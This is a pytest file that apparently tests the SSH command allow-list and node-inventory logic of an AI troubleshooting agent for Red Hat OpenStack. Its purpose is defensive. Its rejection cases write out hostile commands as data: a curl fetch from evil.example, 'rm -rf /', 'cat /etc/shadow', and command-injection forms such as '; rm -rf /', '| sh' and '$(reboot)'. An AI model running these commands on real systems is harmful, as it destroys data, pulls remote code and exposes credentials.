"""Node access: allow-list enforcement and the director-hop command composition.

These are the tests that matter most for safety. The agent's proposed command is attacker-
adjacent input — it is produced by a model reasoning over alarm text — so the assertions here
are about what must *never* reach a shell.
"""

from __future__ import annotations

import pytest

from tsagent.config import DirectorConfig
from tsagent.tools.ssh import AllowList, CommandNotAllowed, CommandResult, SSHExecutor


@pytest.fixture
def director() -> DirectorConfig:
    return DirectorConfig(host="director.lab", user="troubleshoot", key_path="/keys/id_ed25519")


class RecordingExecutor(SSHExecutor):
    """SSHExecutor with the transport replaced, so we can inspect the composed command."""

    def __init__(self, *args, inventory=None, **kwargs):
        super().__init__(*args, **kwargs)
        self.ran: list[str] = []
        self._inventory = inventory if inventory is not None else {
            "overcloud-compute-0": "192.168.24.10"
        }

    async def _run_raw(self, command: str, target: str) -> CommandResult:
        self.ran.append(command)
        return CommandResult(command=command, target=target, ok=True, stdout="ok")


@pytest.fixture
def executor(director, allowlist) -> RecordingExecutor:
    return RecordingExecutor(director, allowlist)


# -- allow-list -------------------------------------------------------------


@pytest.mark.parametrize(
    "command",
    [
        "df -h",
        "df -h /var",
        "systemctl status tripleo_nova_compute",
        "journalctl -u tripleo_nova_compute --no-pager -n 200",
        "sudo podman ps",
        "sudo podman logs --tail 100 nova_compute",
        "free -m",
        "uptime",
        "sudo pcs status",
        "ip -br addr",
    ],
)
def test_allows_read_only_diagnostics(allowlist, command):
    assert allowlist.validate(command, scope="overcloud") == command


@pytest.mark.parametrize(
    "command",
    [
        "rm -rf /var/log",
        "systemctl restart tripleo_nova_compute",
        "reboot",
        "sudo podman stop nova_compute",
        "curl http://evil.example/payload.sh",
        "df -h; rm -rf /",
        "df -h && reboot",
        "df -h | sh",
        "cat /etc/shadow",
        "echo hi > /etc/motd",
        "df -h `reboot`",
        "df -h $(reboot)",
        "",
        "   ",
    ],
)
def test_refuses_anything_not_read_only(allowlist, command):
    with pytest.raises(CommandNotAllowed):
        allowlist.validate(command, scope="overcloud")


def test_refuses_a_prefix_that_only_looks_allowed(allowlist):
    """Patterns are anchored: a valid prefix must not smuggle a tail past validation."""
    with pytest.raises(CommandNotAllowed):
        allowlist.validate("df -h /var/log/../../../etc", scope="overcloud")


def test_scopes_are_separate(allowlist):
    allowlist.validate("openstack server list", scope="director")
    with pytest.raises(CommandNotAllowed):
        allowlist.validate("openstack server list", scope="overcloud")
    with pytest.raises(CommandNotAllowed):
        allowlist.validate("df -h", scope="director")


def test_a_missing_allowlist_file_fails_closed(tmp_path):
    empty = AllowList.load(tmp_path / "does-not-exist.yaml")
    with pytest.raises(CommandNotAllowed):
        empty.validate("df -h", scope="overcloud")


def test_describe_renders_patterns_for_the_prompt(allowlist):
    described = allowlist.describe("overcloud")
    assert "df -h" in described and "#" in described


# -- director hop -----------------------------------------------------------


async def test_director_command_becomes_the_stack_user_and_sources_stackrc(executor):
    await executor.run_director("openstack server list")

    composed = executor.ran[0]
    assert composed.startswith("sudo -u stack -i bash -c ")
    assert "source ~/stackrc && openstack server list" in composed


def _hop(executor) -> str:
    """The composed SSH hop, ignoring the version probe that precedes it."""
    return next(c for c in executor.ran if "ssh -o BatchMode=yes" in c)


async def test_node_command_hops_through_the_director(executor):
    await executor.run_node("overcloud-compute-0", "df -h")

    composed = _hop(executor)
    assert composed.startswith("sudo -u stack -i bash -c ")
    assert "heat-admin@192.168.24.10" in composed
    assert "df -h" in composed


async def test_unknown_node_is_refused_before_any_ssh(executor):
    """The node label comes from alarm data; the inventory is the authority on valid targets."""
    with pytest.raises(CommandNotAllowed, match="not in the overcloud inventory"):
        await executor.run_node("attacker-controlled-host", "df -h")
    assert executor.ran == []


async def test_disallowed_command_never_reaches_the_transport(executor):
    with pytest.raises(CommandNotAllowed):
        await executor.run_node("overcloud-compute-0", "rm -rf /")
    assert executor.ran == []


async def test_node_name_with_a_domain_suffix_resolves(executor):
    await executor.run_node("overcloud-compute-0.lab.example", "uptime")
    assert "heat-admin@192.168.24.10" in _hop(executor)


async def test_inventory_is_parsed_from_openstack_server_list(director, allowlist):
    class InventoryExecutor(RecordingExecutor):
        async def _run_raw(self, command, target):
            self.ran.append(command)
            return CommandResult(
                command=command,
                target=target,
                ok=True,
                stdout=(
                    '[{"Name": "overcloud-controller-0", '
                    '"Networks": {"ctlplane": ["192.168.24.11"]}}]'
                ),
            )

    executor = InventoryExecutor(director, allowlist, inventory=None)
    executor._inventory = None  # force a lookup
    nodes = await executor.list_nodes()

    assert nodes == {"overcloud-controller-0": "192.168.24.11"}


async def test_a_failed_connection_is_a_failed_result_not_a_crash(director, allowlist):
    executor = SSHExecutor(director, allowlist)
    executor._inventory = {"overcloud-compute-0": "192.168.24.10"}

    # No SSH server exists at director.lab in tests, so this exercises the real error path.
    result = await executor.run_node("overcloud-compute-0", "uptime")

    assert not result.ok and result.stderr


# -- inventory discovery across RHOSP versions ------------------------------


class ScriptedDirector(RecordingExecutor):
    """Director whose command outputs are scripted, to model each RHOSP version."""

    def __init__(self, *args, outputs=None, **kwargs):
        super().__init__(*args, **kwargs)
        self.outputs = outputs or {}
        self._inventory = None

    async def _run_raw(self, command, target):
        self.ran.append(command)
        for needle, (ok, stdout, stderr) in self.outputs.items():
            if needle in command:
                return CommandResult(
                    command=command, target=target, ok=ok, stdout=stdout, stderr=stderr,
                    exit_status=0 if ok else 1,
                )
        return CommandResult(command=command, target=target, ok=False, stderr="not scripted")


METALSMITH_JSON = (
    '[{"UUID": "abc", "Hostname": "mhngprdc0204021426ctrl03.rhosp2.jiocaas.com", '
    '"State": "active", "IP Addresses": "ctlplane=192.168.24.13"},'
    ' {"UUID": "def", "Hostname": "mhngprdc0204021320comp05.rhosp2.jiocaas.com", '
    '"State": "active", "IP Addresses": "ctlplane=192.168.24.20"}]'
)

# RHOSP 17 has no Nova on the undercloud, so this is what `openstack server list` returns.
NOVA_GONE = (
    False,
    "",
    "public endpoint for compute service in regionOne region not found",
)


async def test_rhosp17_resolves_nodes_via_metalsmith(director, allowlist):
    executor = ScriptedDirector(
        director, allowlist,
        outputs={"metalsmith list": (True, METALSMITH_JSON, ""),
                 "openstack server list": NOVA_GONE},
    )

    nodes = await executor.list_nodes()

    assert nodes["mhngprdc0204021426ctrl03.rhosp2.jiocaas.com"] == "192.168.24.13"
    # metalsmith is tried first, so the Nova call that fails on RHOSP 17 is never made.
    assert not any("openstack server list" in c for c in executor.ran)


async def test_falls_back_to_nova_on_rhosp16(director, allowlist):
    nova_json = (
        '[{"Name": "overcloud-controller-0", "Networks": {"ctlplane": ["192.168.24.11"]}}]'
    )
    executor = ScriptedDirector(
        director, allowlist,
        outputs={"metalsmith list": (False, "", "metalsmith: command not found"),
                 "openstack baremetal node list": (False, "", "boom"),
                 "openstack server list": (True, nova_json, "")},
    )

    nodes = await executor.list_nodes()

    assert nodes == {"overcloud-controller-0": "192.168.24.11"}


async def test_every_source_failing_yields_an_empty_inventory(director, allowlist):
    executor = ScriptedDirector(
        director, allowlist, outputs={"openstack server list": NOVA_GONE},
    )
    assert await executor.list_nodes() == {}


async def test_static_node_map_short_circuits_discovery(director, allowlist):
    director.nodes = {"mhngprdc0204021426ctrl03.rhosp2.jiocaas.com": "192.168.24.13"}
    executor = ScriptedDirector(director, allowlist, outputs={})

    nodes = await executor.list_nodes()

    assert nodes == director.nodes
    assert executor.ran == [], "a configured map must not call the undercloud at all"


async def test_site_specific_fqdn_resolves(director, allowlist):
    """The alarm carries the OS hostname; metalsmith reports the same host as an FQDN."""
    executor = ScriptedDirector(
        director, allowlist, outputs={"metalsmith list": (True, METALSMITH_JSON, "")},
    )

    ip = await executor.resolve_node("mhngprdc0204021426ctrl03")

    assert ip == "192.168.24.13"


async def test_unknown_node_refusal_names_what_is_known(director, allowlist):
    executor = ScriptedDirector(
        director, allowlist, outputs={"metalsmith list": (True, METALSMITH_JSON, "")},
    )

    with pytest.raises(CommandNotAllowed, match="known:"):
        await executor.run_node("some-other-host", "uptime")


async def test_metalsmith_is_allow_listed(allowlist):
    assert allowlist.validate("metalsmith list -f json", scope="director")


@pytest.mark.parametrize(
    ("value", "expected"),
    [
        ("ctlplane=192.168.24.10", "192.168.24.10"),
        ("ctlplane=192.168.24.10, external=10.0.0.5", "192.168.24.10"),
        ("external=10.0.0.5, ctlplane=192.168.24.10", "192.168.24.10"),
        ({"ctlplane": ["192.168.24.10"]}, "192.168.24.10"),
        ({"ctlplane": "192.168.24.10"}, "192.168.24.10"),
        ({"external": ["10.0.0.5"]}, "10.0.0.5"),
        (["192.168.24.10"], "192.168.24.10"),
        ("192.168.24.10", "192.168.24.10"),
        ("", ""),
        (None, ""),
    ],
)
def test_address_extraction_handles_every_reported_shape(value, expected):
    from tsagent.tools.ssh import _first_address

    assert _first_address(value) == expected


def test_rows_without_an_address_are_skipped():
    """`openstack baremetal node list` has no addresses, so it cannot drive an SSH hop."""
    from tsagent.tools.ssh import _parse_inventory

    ironic = '[{"Name": "overcloud-controller-0", "Power State": "power on"}]'
    assert _parse_inventory(ironic) == {}


# -- platform detection -----------------------------------------------------


RHOSP17_RELEASE = "Red Hat OpenStack Platform release 17.1.3 (Wallaby)\n"
RHOSP16_RELEASE = "Red Hat OpenStack Platform release 16.2.6 (Train)\n"
NOVA_JSON = (
    '[{"Name": "overcloud-controller-0", "Networks": {"ctlplane": ["192.168.24.11"]}}]'
)


async def test_version_is_detected_from_the_release_file(director, allowlist):
    executor = ScriptedDirector(
        director, allowlist, outputs={"rhosp-release": (True, RHOSP17_RELEASE, "")},
    )
    assert await executor.detect_version() == "17"


async def test_version_is_detected_only_once(director, allowlist):
    executor = ScriptedDirector(
        director, allowlist, outputs={"rhosp-release": (True, RHOSP17_RELEASE, "")},
    )
    await executor.detect_version()
    await executor.detect_version()
    assert sum("rhosp-release" in c for c in executor.ran) == 1


async def test_configured_version_skips_detection(director, allowlist):
    director.osp_version = "17"
    executor = ScriptedDirector(director, allowlist, outputs={})
    assert await executor.detect_version() == "17"
    assert executor.ran == []


async def test_rhosp17_uses_tripleo_admin(director, allowlist):
    executor = ScriptedDirector(
        director, allowlist, outputs={"rhosp-release": (True, RHOSP17_RELEASE, "")},
    )
    assert await executor.overcloud_user() == "tripleo-admin"


async def test_rhosp16_uses_heat_admin(director, allowlist):
    executor = ScriptedDirector(
        director, allowlist, outputs={"rhosp-release": (True, RHOSP16_RELEASE, "")},
    )
    assert await executor.overcloud_user() == "heat-admin"


async def test_explicit_user_overrides_detection(director, allowlist):
    director.overcloud_user = "custom-admin"
    executor = ScriptedDirector(
        director, allowlist, outputs={"rhosp-release": (True, RHOSP17_RELEASE, "")},
    )
    assert await executor.overcloud_user() == "custom-admin"


async def test_unknown_version_keeps_heat_admin(director, allowlist):
    """Guessing tripleo-admin would break a RHOSP 16 estate that previously worked."""
    executor = ScriptedDirector(director, allowlist, outputs={})
    assert await executor.overcloud_user() == "heat-admin"


async def test_detected_version_picks_the_inventory_command(director, allowlist):
    executor = ScriptedDirector(
        director, allowlist,
        outputs={"rhosp-release": (True, RHOSP16_RELEASE, ""),
                 "openstack server list": (True, NOVA_JSON, "")},
    )

    nodes = await executor.list_nodes()

    assert nodes == {"overcloud-controller-0": "192.168.24.11"}
    # On RHOSP 16 the Nova form is tried first, so metalsmith is never called.
    assert not any("metalsmith" in c for c in executor.ran)


async def test_platform_notes_tell_the_agent_about_pacemaker_bundles(director, allowlist):
    executor = ScriptedDirector(
        director, allowlist, outputs={"rhosp-release": (True, RHOSP17_RELEASE, "")},
    )

    notes = await executor.platform_notes()

    assert "RHOSP 17" in notes
    assert "-podman-N" in notes and "pcs" in notes
    assert "never systemctl" in notes


async def test_platform_notes_are_empty_when_the_version_is_unknown(director, allowlist):
    executor = ScriptedDirector(director, allowlist, outputs={})
    assert await executor.platform_notes() == ""


# -- hostname matching ------------------------------------------------------


@pytest.mark.parametrize(
    ("alarm_host", "inventory_host", "should_match"),
    [
        # Same host, FQDN in the alarm and short name in the inventory.
        ("ctrl03.rhosp2.jiocaas.com", "ctrl03", True),
        ("ctrl03", "ctrl03.rhosp2.jiocaas.com", True),
        ("ctrl03.rhosp2.jiocaas.com", "ctrl03.rhosp2.jiocaas.com", True),
        ("CTRL03.rhosp2.jiocaas.com", "ctrl03", True),
        # Different hosts that a substring match would wrongly conflate.
        ("ctrl0.rhosp2.jiocaas.com", "ctrl01", False),
        ("ctrl01.rhosp2.jiocaas.com", "ctrl0", False),
        ("comp05.rhosp2.jiocaas.com", "comp0", False),
    ],
)
async def test_hostname_matching_is_exact_on_the_short_name(
    director, allowlist, alarm_host, inventory_host, should_match
):
    director.nodes = {inventory_host: "192.168.24.13"}
    executor = ScriptedDirector(director, allowlist, outputs={})

    resolved = await executor.resolve_node(alarm_host)

    assert (resolved == "192.168.24.13") is should_match


async def test_configured_domain_is_stripped(director, allowlist):
    director.domain = "rhosp2.jiocaas.com"
    director.nodes = {"mhngprdc0204021426ctrl03": "192.168.24.13"}
    executor = ScriptedDirector(director, allowlist, outputs={})

    assert await executor.resolve_node(
        "mhngprdc0204021426ctrl03.rhosp2.jiocaas.com"
    ) == "192.168.24.13"


async def test_a_multi_label_hostname_survives_domain_stripping(director, allowlist):
    """Without the domain configured, only the first label is compared."""
    director.domain = "rhosp2.jiocaas.com"
    director.nodes = {"node.rack1": "192.168.24.99"}
    executor = ScriptedDirector(director, allowlist, outputs={})

    assert await executor.resolve_node("node.rack1.rhosp2.jiocaas.com") == "192.168.24.99"


async def test_ambiguous_first_label_is_refused_rather_than_guessed(director, allowlist):
    """Two hosts sharing a first label must not be silently conflated."""
    director.domain = "rhosp2.jiocaas.com"
    director.nodes = {"node.rack1": "192.168.24.1", "node.rack2": "192.168.24.2"}
    executor = ScriptedDirector(director, allowlist, outputs={})

    assert await executor.resolve_node("node.somewhere-else.com") is None
